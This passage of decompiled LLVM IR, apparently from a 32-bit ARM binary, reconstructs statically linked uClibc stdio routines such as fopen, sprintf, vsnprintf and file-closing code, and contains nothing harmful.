  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_faec = load i32, i32* @r4, align 4
  store i32 %v3_faec, i32* %stack_var_-36, align 4
  %v6_faec = load i32, i32* @r5, align 4
  %v9_faec = load i32, i32* @r6, align 4
  %v12_faec = load i32, i32* @r7, align 4
  %v15_faec = load i32, i32* @r8, align 4
  %v27_faec = load i32, i32* @lr, align 4
  %v2_faf0 = add i32 %tmp, 52
  %v3_faf0 = inttoptr i32 %v2_faf0 to i32*
  %v4_faf0 = load i32, i32* %v3_faf0, align 4
  %v1_faf8 = sub i32 1, %v4_faf0
  %v2_faf8 = icmp ult i32 %v4_faf0, 2
  br i1 %v2_faf8, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_faf8, %entry ]
  %v0_fb00 = phi i32 [ 0, %bb ], [ %v1_faf8, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_fb00 = icmp eq i32 %v0_fb00, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r6, align 4
  br i1 %v2_fb00, label %dec_label_pc_fb4c, label %dec_label_pc_fb14

dec_label_pc_fb14:                                ; preds = %thread-pre-split
  %v4_fb2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_fb2c)
  %v0_fb40 = load i32, i32* @r6, align 4
  %v2_fb40 = add i32 %v0_fb40, 16
  %v3_fb40 = inttoptr i32 %v2_fb40 to i32*
  %v4_fb40 = load i32, i32* %v3_fb40, align 4
  call void @__pseudo_branch(i32 %v4_fb40)
  %v0_fb4c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fb4c

dec_label_pc_fb4c:                                ; preds = %thread-pre-split, %dec_label_pc_fb14
  %v1_fb54 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_fb4c.pre, %dec_label_pc_fb14 ]
  %v1_fb4c = inttoptr i32 %v1_fb54 to i16*
  %v2_fb4c = load i16, i16* %v1_fb4c, align 2
  %v3_fb4c = zext i16 %v2_fb4c to i32
  %v1_fb50 = and i32 %v3_fb4c, 64
  %v2_fb50 = icmp eq i32 %v1_fb50, 0
  br i1 %v2_fb50, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_fb4c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_fb4c, %bb17
  %storemerge24 = phi i32 [ %v1_fb54, %bb17 ], [ %v1_fb50, %dec_label_pc_fb4c ]
  %v1_fb58 = xor i1 %v2_fb50, true
  call void @__pseudo_cond_branch(i1 %v1_fb58, i32 ptrtoint (i32* @global_var_11604.308 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_fb60 = load i32, i32* @r5, align 4
  %v1_fb60 = add i32 %v0_fb60, 4
  %v2_fb60 = inttoptr i32 %v1_fb60 to i32*
  %v3_fb60 = load i32, i32* %v2_fb60, align 4
  %v1_fb64 = call i32 @__GI_close(i32 %v3_fb60)
  %v0_fb6c = load i32, i32* @r6, align 4
  %v2_fb78 = add i32 %v0_fb6c, 112
  %v3_fb78 = inttoptr i32 %v2_fb78 to i32*
  %v4_fb78 = load i32, i32* %v3_fb78, align 4
  store i32 %v4_fb78, i32* @r7, align 4
  %v1_fb80 = load i32, i32* @r5, align 4
  %v2_fb80 = add i32 %v1_fb80, 4
  %v3_fb80 = inttoptr i32 %v2_fb80 to i32*
  store i32 -1, i32* %v3_fb80, align 4
  %v0_fb88 = load i32, i32* @r6, align 4
  %v2_fb88 = add i32 %v0_fb88, 76
  %v3_fb88 = inttoptr i32 %v2_fb88 to i32*
  %v4_fb88 = load i32, i32* %v3_fb88, align 4
  %v1_fb90 = icmp slt i32 %v1_fb64, 0
  store i32 %v4_fb88, i32* %stack_var_-80, align 4
  br i1 %v1_fb90, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_fb88)
  %v0_fbb8 = load i32, i32* @r6, align 4
  %v2_fbb8 = add i32 %v0_fbb8, 16
  %v3_fbb8 = inttoptr i32 %v2_fbb8 to i32*
  %v4_fbb8 = load i32, i32* %v3_fbb8, align 4
  call void @__pseudo_branch(i32 %v4_fbb8)
  %v0_fbc8 = load i32, i32* @r6, align 4
  %v2_fbc8 = add i32 %v0_fbc8, 12
  %v3_fbc8 = inttoptr i32 %v2_fbc8 to i32*
  %v4_fbc8 = load i32, i32* %v3_fbc8, align 4
  %v1_fbcc = inttoptr i32 %v4_fbc8 to i32*
  %v2_fbcc = load i32, i32* %v1_fbcc, align 4
  %v1_fbd4 = add i32 %v2_fbcc, 1
  %v2_fbd8 = add i32 %v0_fbc8, 24
  %v3_fbd8 = inttoptr i32 %v2_fbd8 to i32*
  %v4_fbd8 = load i32, i32* %v3_fbd8, align 4
  store i32 %v4_fbd8, i32* @r4, align 4
  store i32 %v1_fbd4, i32* %v1_fbcc, align 4
  call void @__pseudo_branch(i32 %v4_fbd8)
  %v0_fbf0 = load i32, i32* @r5, align 4
  %v1_fbf0 = inttoptr i32 %v0_fbf0 to i16*
  %v2_fbf0 = load i16, i16* %v1_fbf0, align 2
  %v1_fbf4 = and i16 %v2_fbf0, 24576
  %v1_fbf8 = or i16 %v1_fbf4, 48
  %v0_fbfc = load i32, i32* %sb.global-to-local, align 4
  %v2_fbfc = icmp eq i32 %v0_fbfc, 0
  store i16 %v1_fbf8, i16* %v1_fbf0, align 2
  br i1 %v2_fbfc, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_fc10 = xor i1 %v2_fbfc, true
  call void @__pseudo_cond_branch(i1 %v2_fc10, i32 %v4_fbd8)
  %v0_fc14 = load i32, i32* @r5, align 4
  %v1_fc14 = inttoptr i32 %v0_fc14 to i16*
  %v2_fc14 = load i16, i16* %v1_fc14, align 2
  %v1_fc18 = and i16 %v2_fc14, 16384
  %v2_fc18 = icmp eq i16 %v1_fc18, 0
  br i1 %v2_fc18, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_fc20 = xor i1 %v2_fc18, true
  call void @__pseudo_cond_branch(i1 %v1_fc20, i32 ptrtoint (i32* @global_var_1363c.312 to i32))
  %v2_fc2c = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_fc2c)
  call void @__pseudo_branch(i32 %v4_fbb8)
  %v0_fc4c = load i32, i32* @r6, align 4
  %v2_fc4c = add i32 %v0_fc4c, 52
  %v3_fc4c = inttoptr i32 %v2_fc4c to i32*
  %v4_fc4c = load i32, i32* %v3_fc4c, align 4
  %v1_fc50 = inttoptr i32 %v4_fc4c to i32*
  %v2_fc50 = load i32, i32* %v1_fc50, align 4
  %v1_fc54 = add i32 %v2_fc50, 1
  store i32 %v1_fc54, i32* %v1_fc50, align 4
  call void @__pseudo_branch(i32 %v4_fbd8)
  %v0_fc6c = call i32 @_stdio_openlist_dec_use()
  %v0_fc70 = load i32, i32* %sl.global-to-local, align 4
  %v2_fc78 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_fc78, i32* @r4, align 4
  store i32 %v6_faec, i32* @r5, align 4
  store i32 %v9_faec, i32* @r6, align 4
  store i32 %v12_faec, i32* @r7, align 4
  store i32 %v15_faec, i32* @r8, align 4
  store i32 %v27_faec, i32* @lr, align 4
  ret i32 %v0_fc70

; uselistorder directives
  uselistorder i1 %v2_fc18, { 1, 0 }
  uselistorder i32 %v4_fbd8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_faf8, { 1, 0 }
  uselistorder i32 %v4_faf0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_fb4c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_fc84(i32 %arg1) local_unnamed_addr {
dec_label_pc_fc84:
  %v0_fc84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fc84, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_fc84
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_fc84, %bb
  %v10_fc9c = phi i32 [ %arg1, %dec_label_pc_fc84 ], [ 0, %bb ]
  ret i32 %v10_fc9c

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_fcb0 = call i32 @_stdio_fopen()
  ret i32 %v0_fcb0
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_fccc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_fccc, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_fce0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_fce0

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_fcf4 = load i32, i32* @r4, align 4
  %v6_fcf4 = load i32, i32* @r5, align 4
  %v9_fcf4 = load i32, i32* @r6, align 4
  %v12_fcf4 = load i32, i32* @r7, align 4
  %v18_fcf4 = load i32, i32* @sl, align 4
  %v2_fcfc = ptrtoint i32* %stack_var_-112 to i32
  %v0_fd00 = load i32, i32* @r0, align 4
  store i32 %v0_fd00, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_fd08 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_fd08, i32* @r0, align 4
  %v0_fd10 = load i32, i32* @r3, align 4
  store i32 %v0_fd10, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_fd1c = load i32, i32* @r1, align 4
  store i32 %v0_fd1c, i32* @r5, align 4
  %v0_fd20 = load i32, i32* @r2, align 4
  store i32 %v0_fd20, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_fd34 = call i32 @__stdio_init_mutex(i32 %v2_fd08)
  %v0_fd38 = load i32, i32* @r4, align 4
  %v1_fd38 = sub i32 -1, %v0_fd38
  %v0_fd3c = load i32, i32* @r5, align 4
  %v3_fd3c = icmp ult i32 %v0_fd3c, %v1_fd38
  br i1 %v3_fd3c, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_fd38, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_fd44 = phi i32 [ %v0_fd3c, %entry ], [ %v1_fd38, %bb ]
  %v2_fd44 = add i32 %v1_fd44, %v0_fd38
  %v0_fd4c = load i32, i32* @r6, align 4
  %v0_fd50 = load i32, i32* @r7, align 4
  %v0_fd5c = load i32, i32* @sl, align 4
  %v5_fd68 = inttoptr i32 %v0_fd38 to i8*
  %v15_fd70 = inttoptr i32 %v0_fd4c to i8*
  %v16_fd70 = call i32 @_vfprintf_internal(i32 %v2_fcfc, i8* %v15_fd70, i32 %v0_fd50, i32 %v2_fd44, i32 %v0_fd38, i32 %v2_fd44, i32 %v0_fd38, i32 %v0_fd38, i32 %v0_fd38, i32 %v2_fd44, i32 %v0_fd5c)
  %v0_fd74 = load i32, i32* @r5, align 4
  %v1_fd74 = load i32, i32* @sl, align 4
  %v9_fd74 = icmp eq i32 %v0_fd74, %v1_fd74
  br i1 %v9_fd74, label %dec_label_pc_fd9c, label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %bb26
  %v3_fd44 = inttoptr i32 %v2_fd44 to i8*
  %v9_fd88 = icmp eq i8* %v5_fd68, %v3_fd44
  br i1 %v9_fd88, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_fd80
  %v2_fd8c = add i32 %v0_fd38, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_fd80, %bb27
  %v1_fd90 = phi i32 [ %v2_fd44, %dec_label_pc_fd80 ], [ %v2_fd8c, %bb27 ]
  %v6_fd90 = inttoptr i32 %v1_fd90 to i8*
  %stack_var_-96.0 = select i1 %v9_fd88, i8* %v6_fd90, i8* %v5_fd68
  %v1_fd98 = trunc i32 %v1_fd74 to i8
  store i8 %v1_fd98, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_fd9c

dec_label_pc_fd9c:                                ; preds = %bb26, %bb28
  store i32 %v3_fcf4, i32* @r4, align 4
  store i32 %v6_fcf4, i32* @r5, align 4
  store i32 %v9_fcf4, i32* @r6, align 4
  store i32 %v12_fcf4, i32* @r7, align 4
  store i32 %v18_fcf4, i32* @sl, align 4
  ret i32 %v16_fd70

; uselistorder directives
  uselistorder i32 %v2_fd44, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_fd38, { 2, 1, 0 }
  uselistorder i32 %v0_fd38, { 2, 4, 5, 7, 3, 6, 1, 0 }
  uselistorder label %dec_label_pc_fd9c, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fda8 = load i32, i32* @r4, align 4
  store i32 %v3_fda8, i32* %stack_var_-36, align 4
  %v6_fda8 = load i32, i32* @r5, align 4
  %v9_fda8 = load i32, i32* @r6, align 4
  %v18_fda8 = load i32, i32* @sb, align 4
  %v24_fda8 = load i32, i32* @fp, align 4
  %v0_fdac = load i32, i32* @r1, align 4
  %v1_fdac = inttoptr i32 %v0_fdac to i8*
  %v2_fdac = load i8, i8* %v1_fdac, align 1
  %v3_fdac = zext i8 %v2_fdac to i32
  store i32 %v3_fdac, i32* @ip, align 4
  %v7_fdb4 = icmp eq i8 %v2_fdac, 114
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @fp, align 4
  %v2_fdbc = ptrtoint i32* %stack_var_-72 to i32
  %v0_fdc0 = load i32, i32* @r0, align 4
  store i32 %v0_fdc0, i32* @r6, align 4
  %v0_fdc4 = load i32, i32* @r2, align 4
  store i32 %v0_fdc4, i32* @sb, align 4
  %v0_fdc8 = load i32, i32* @r3, align 4
  store i32 %v0_fdc8, i32* @r5, align 4
  br i1 %v7_fdb4, label %dec_label_pc_fe14, label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %entry
  %v7_fdd0 = icmp eq i8 %v2_fdac, 119
  br i1 %v7_fdd0, label %bb, label %dec_label_pc_fddc

bb:                                               ; preds = %dec_label_pc_fdd0
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_fe18

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fdd0
  %v7_fddc = icmp eq i8 %v2_fdac, 97
  br i1 %v7_fddc, label %bb34, label %dec_label_pc_fde8

bb34:                                             ; preds = %dec_label_pc_fddc
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_fe18

dec_label_pc_fde8:                                ; preds = %dec_label_pc_fddc, %dec_label_pc_fe9c, %dec_label_pc_fe70
  %v0_fde8 = call i32 @__GI___errno_location()
  store i32 %v0_fde8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_fdf0 = load i32, i32* @sb, align 4
  %v2_fdf0 = icmp eq i32 %v0_fdf0, 0
  %v2_fdf4 = inttoptr i32 %v0_fde8 to i32*
  store i32 22, i32* %v2_fdf4, align 4
  br i1 %v2_fdf0, label %dec_label_pc_10068, label %dec_label_pc_fdfc

dec_label_pc_fdfc:                                ; preds = %dec_label_pc_fec0._crit_edge, %dec_label_pc_fde8
  %v0_fdfc = load i32, i32* @sb, align 4
  %v1_fdfc = inttoptr i32 %v0_fdfc to i16*
  %v2_fdfc = load i16, i16* %v1_fdfc, align 2
  %v3_fdfc = zext i16 %v2_fdfc to i32
  store i32 %v3_fdfc, i32* %r3.global-to-local, align 4
  %v1_fe00 = and i32 %v3_fdfc, 8192
  %v2_fe00 = icmp eq i32 %v1_fe00, 0
  br i1 %v2_fe00, label %dec_label_pc_10068, label %dec_label_pc_fe08

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fdfc
  store i32 %v0_fdfc, i32* @r0, align 4
  %v0_fe0c = call i32 @free()
  store i32 %v0_fe0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10068

dec_label_pc_fe14:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %bb, %bb34, %dec_label_pc_fe14
  %v1_fe30 = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_fe14 ]
  %v1_fe18 = add i32 %v0_fdac, 1
  %v2_fe18 = inttoptr i32 %v1_fe18 to i8*
  %v3_fe18 = load i8, i8* %v2_fe18, align 1
  %v7_fe1c = icmp eq i8 %v3_fe18, 98
  %v1_fe18.v0_fdac = select i1 %v7_fe1c, i32 %v1_fe18, i32 %v0_fdac
  store i32 %v1_fe18.v0_fdac, i32* %r3.global-to-local, align 4
  %v1_fe28 = add i32 %v1_fe18.v0_fdac, 1
  %v2_fe28 = inttoptr i32 %v1_fe28 to i8*
  %v3_fe28 = load i8, i8* %v2_fe28, align 1
  %v4_fe28 = zext i8 %v3_fe28 to i32
  store i32 %v4_fe28, i32* @r3, align 4
  %v7_fe2c = icmp eq i8 %v3_fe28, 43
  br i1 %v7_fe2c, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_fe18
  store i32 %v1_fe30, i32* @r3, align 4
  %v2_fe34 = add nuw nsw i32 %v1_fe30, 1
  store i32 %v2_fe34, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_fe18, %bb37
  %v2_fe38 = icmp eq i32 %v0_fdc4, 0
  br i1 %v2_fe38, label %dec_label_pc_fe40, label %dec_label_pc_fe68

dec_label_pc_fe40:                                ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_fe44 = call i32 @malloc(i32 80)
  store i32 %v1_fe44, i32* %r0.global-to-local, align 4
  store i32 %v1_fe44, i32* @sb, align 4
  %v3_fe48 = icmp eq i32 %v1_fe44, 0
  br i1 %v3_fe48, label %dec_label_pc_1006c, label %dec_label_pc_fe50

dec_label_pc_fe50:                                ; preds = %dec_label_pc_fe40
  %v2_fe54 = add i32 %v1_fe44, 8
  %v3_fe54 = inttoptr i32 %v2_fe54 to i32*
  store i32 0, i32* %v3_fe54, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_fe5c = load i32, i32* @sb, align 4
  %v3_fe5c = inttoptr i32 %v2_fe5c to i16*
  store i16 8192, i16* %v3_fe5c, align 2
  %v0_fe60 = load i32, i32* @sb, align 4
  %v1_fe60 = add i32 %v0_fe60, 56
  store i32 %v1_fe60, i32* @r0, align 4
  %v1_fe64 = call i32 @__stdio_init_mutex(i32 %v1_fe60)
  store i32 %v1_fe64, i32* %r0.global-to-local, align 4
  %v0_fe68.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fe68

dec_label_pc_fe68:                                ; preds = %.thread5, %dec_label_pc_fe50
  %v0_fec0 = phi i32 [ %v0_fdc8, %.thread5 ], [ %v0_fe68.pre, %dec_label_pc_fe50 ]
  %v1_fe68 = icmp slt i32 %v0_fec0, 0
  br i1 %v1_fe68, label %dec_label_pc_fec0, label %dec_label_pc_fe70

dec_label_pc_fe70:                                ; preds = %dec_label_pc_fe68
  %v0_fe74 = load i32, i32* @r4, align 4
  %v2_fe74 = and i32 %v0_fe74, 131075
  %v1_fe78 = add nuw nsw i32 %v2_fe74, 1
  store i32 %v1_fe78, i32* %r2.global-to-local, align 4
  %v0_fe7c = load i32, i32* @r6, align 4
  %v1_fe7c = add i32 %v0_fe7c, 1
  %v2_fe80 = and i32 %v1_fe7c, %v1_fe78
  store i32 %v2_fe80, i32* %r3.global-to-local, align 4
  %v9_fe84 = icmp eq i32 %v2_fe80, %v1_fe78
  %v1_fe88 = load i32, i32* @sb, align 4
  %v2_fe88 = add i32 %v1_fe88, 4
  %v3_fe88 = inttoptr i32 %v2_fe88 to i32*
  store i32 %v0_fec0, i32* %v3_fe88, align 4
  br i1 %v9_fe84, label %dec_label_pc_fe90, label %dec_label_pc_fde8

dec_label_pc_fe90:                                ; preds = %dec_label_pc_fe70
  %v0_fe90 = load i32, i32* @r4, align 4
  %v1_fe90 = load i32, i32* @r6, align 4
  %v2_fe90 = sub i32 -1, %v1_fe90
  %v3_fe90 = and i32 %v0_fe90, %v2_fe90
  store i32 %v3_fe90, i32* @r3, align 4
  %v1_fe94 = and i32 %v3_fe90, 1024
  %v2_fe94 = icmp eq i32 %v1_fe94, 0
  br i1 %v2_fe94, label %dec_label_pc_feb4, label %dec_label_pc_fe9c

dec_label_pc_fe9c:                                ; preds = %dec_label_pc_fe90
  %v0_fe9c = load i32, i32* @r5, align 4
  store i32 %v0_fe9c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_fea8 = call i32 @__libc_fcntl(i32 %v0_fe9c, i32 4)
  store i32 %v2_fea8, i32* %r0.global-to-local, align 4
  %v2_feac = icmp eq i32 %v2_fea8, 0
  br i1 %v2_feac, label %dec_label_pc_fe9c.dec_label_pc_feb4_crit_edge, label %dec_label_pc_fde8

dec_label_pc_fe9c.dec_label_pc_feb4_crit_edge:    ; preds = %dec_label_pc_fe9c
  %v0_feb4.pre = load i32, i32* @r6, align 4
  %v0_feb8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_feb4

dec_label_pc_feb4:                                ; preds = %dec_label_pc_fe9c.dec_label_pc_feb4_crit_edge, %dec_label_pc_fe90
  %v0_feb8 = phi i32 [ %v0_feb8.pre, %dec_label_pc_fe9c.dec_label_pc_feb4_crit_edge ], [ %v0_fe90, %dec_label_pc_fe90 ]
  %v0_feb4 = phi i32 [ %v0_feb4.pre, %dec_label_pc_fe9c.dec_label_pc_feb4_crit_edge ], [ %v1_fe90, %dec_label_pc_fe90 ]
  %v1_feb4 = and i32 %v0_feb4, 131072
  store i32 %v1_feb4, i32* %r3.global-to-local, align 4
  %v2_feb8 = or i32 %v1_feb4, %v0_feb8
  store i32 %v2_feb8, i32* @r4, align 4
  br label %dec_label_pc_fee4

dec_label_pc_fec0:                                ; preds = %dec_label_pc_fe68
  %v7_fec0 = icmp eq i32 %v0_fec0, -1
  %v0_fecc.pre = load i32, i32* @r4, align 4
  br i1 %v7_fec0, label %dec_label_pc_fec0._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_fec0
  %v2_fec4 = or i32 %v0_fecc.pre, 131072
  store i32 %v2_fec4, i32* @r4, align 4
  br label %dec_label_pc_fec0._crit_edge

dec_label_pc_fec0._crit_edge:                     ; preds = %dec_label_pc_fec0, %bb38
  %v0_fecc = phi i32 [ %v2_fec4, %bb38 ], [ %v0_fecc.pre, %dec_label_pc_fec0 ]
  %v0_fec8 = load i32, i32* @r6, align 4
  store i32 %v0_fec8, i32* %r0.global-to-local, align 4
  store i32 %v0_fecc, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_fed4 = call i32 @__GI_open(i32 %v0_fec8, i32 %v0_fecc)
  store i32 %v2_fed4, i32* %r0.global-to-local, align 4
  %v1_fed8 = icmp slt i32 %v2_fed4, 0
  %v1_fedc = load i32, i32* @sb, align 4
  %v2_fedc = add i32 %v1_fedc, 4
  %v3_fedc = inttoptr i32 %v2_fedc to i32*
  store i32 %v2_fed4, i32* %v3_fedc, align 4
  br i1 %v1_fed8, label %dec_label_pc_fdfc, label %.dec_label_pc_fee4_crit_edge

.dec_label_pc_fee4_crit_edge:                     ; preds = %dec_label_pc_fec0._crit_edge
  %v0_fee8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fee4

dec_label_pc_fee4:                                ; preds = %.dec_label_pc_fee4_crit_edge, %dec_label_pc_feb4
  %v0_ff00 = phi i32 [ %v0_fee8.pre, %.dec_label_pc_fee4_crit_edge ], [ %v2_feb8, %dec_label_pc_feb4 ]
  %v0_fee4 = load i32, i32* @sb, align 4
  %v1_fee4 = inttoptr i32 %v0_fee4 to i16*
  %v2_fee4 = load i16, i16* %v1_fee4, align 2
  %v3_fee4 = zext i16 %v2_fee4 to i32
  %v1_fee8 = urem i32 %v0_ff00, 4
  %v1_feec = and i32 %v0_ff00, 1024
  %v1_fef0 = and i32 %v3_fee4, 8192
  %v1_fef4 = add nuw nsw i32 %v1_fee8, 1
  %v2_fef8 = or i32 %v1_fef0, %v1_feec
  store i32 %v2_fef8, i32* %r3.global-to-local, align 4
  %v1_fefc = xor i32 %v1_fef4, 3
  store i32 %v1_fefc, i32* %r1.global-to-local, align 4
  %v1_ff00 = and i32 %v0_ff00, 131072
  store i32 %v1_ff00, i32* %r2.global-to-local, align 4
  %v2_ff00 = icmp eq i32 %v1_ff00, 0
  %v1_ff04 = add i32 %v0_fee4, 4
  %v2_ff04 = inttoptr i32 %v1_ff04 to i32*
  %v3_ff04 = load i32, i32* %v2_ff04, align 4
  store i32 %v3_ff04, i32* @r5, align 4
  br i1 %v2_ff00, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_fee4
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_fee4, %bb39
  %v0_ff10 = phi i32 [ 0, %dec_label_pc_fee4 ], [ 32768, %bb39 ]
  %v4_ff0c = mul nuw nsw i32 %v1_fefc, 16
  %v5_ff0c = or i32 %v2_fef8, %v4_ff0c
  store i32 %v5_ff0c, i32* %r3.global-to-local, align 4
  %v2_ff10 = or i32 %v0_ff10, %v5_ff0c
  store i32 %v2_ff10, i32* %r2.global-to-local, align 4
  %v8_ff14 = icmp eq i32 %v3_ff04, 2147483647
  %v1_ff18 = trunc i32 %v2_ff10 to i16
  store i16 %v1_ff18, i16* %v1_fee4, align 2
  br i1 %v8_ff14, label %dec_label_pc_ff48, label %dec_label_pc_ff20

dec_label_pc_ff20:                                ; preds = %bb40
  %v0_ff20 = call i32 @__GI___errno_location()
  store i32 %v0_ff20, i32* @r4, align 4
  %v0_ff28 = load i32, i32* @r5, align 4
  store i32 %v0_ff28, i32* @r0, align 4
  %v1_ff2c = inttoptr i32 %v0_ff20 to i32*
  %v2_ff2c = load i32, i32* %v1_ff2c, align 4
  store i32 %v2_ff2c, i32* @r5, align 4
  %v1_ff30 = call i32 @isatty(i32 %v0_ff28)
  store i32 %v1_ff30, i32* %r0.global-to-local, align 4
  %v2_ff34 = icmp eq i32 %v1_ff30, 0
  br i1 %v2_ff34, label %.thread7, label %bb41

bb41:                                             ; preds = %dec_label_pc_ff20
  %v1_ff38 = load i32, i32* @sb, align 4
  %v2_ff38 = inttoptr i32 %v1_ff38 to i16*
  %v3_ff38 = load i16, i16* %v2_ff38, align 2
  %v4_ff38 = zext i16 %v3_ff38 to i32
  %v2_ff3c = or i32 %v4_ff38, 256
  store i32 %v2_ff3c, i32* %r3.global-to-local, align 4
  %v2_ff40 = trunc i32 %v2_ff3c to i16
  store i16 %v2_ff40, i16* %v2_ff38, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ff20, %bb41
  %v0_ff44 = load i32, i32* @r5, align 4
  %v1_ff44 = load i32, i32* @r4, align 4
  %v2_ff44 = inttoptr i32 %v1_ff44 to i32*
  store i32 %v0_ff44, i32* %v2_ff44, align 4
  br label %dec_label_pc_ff48

dec_label_pc_ff48:                                ; preds = %bb40, %.thread7
  %v0_ff48 = load i32, i32* @sb, align 4
  %v1_ff48 = add i32 %v0_ff48, 8
  %v2_ff48 = inttoptr i32 %v1_ff48 to i32*
  %v3_ff48 = load i32, i32* %v2_ff48, align 4
  store i32 %v3_ff48, i32* %r3.global-to-local, align 4
  %v2_ff4c = icmp eq i32 %v3_ff48, 0
  br i1 %v2_ff4c, label %dec_label_pc_ff54, label %bb42

dec_label_pc_ff54:                                ; preds = %dec_label_pc_ff48
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_ff58 = call i32 @malloc(i32 4096)
  store i32 %v1_ff58, i32* %r0.global-to-local, align 4
  %v2_ff5c = icmp eq i32 %v1_ff58, 0
  %v1_ff6c.pre = load i32, i32* @sb, align 4
  br i1 %v2_ff5c, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_ff54
  %v2_ff60 = inttoptr i32 %v1_ff6c.pre to i16*
  %v3_ff60 = load i16, i16* %v2_ff60, align 2
  %v4_ff60 = zext i16 %v3_ff60 to i32
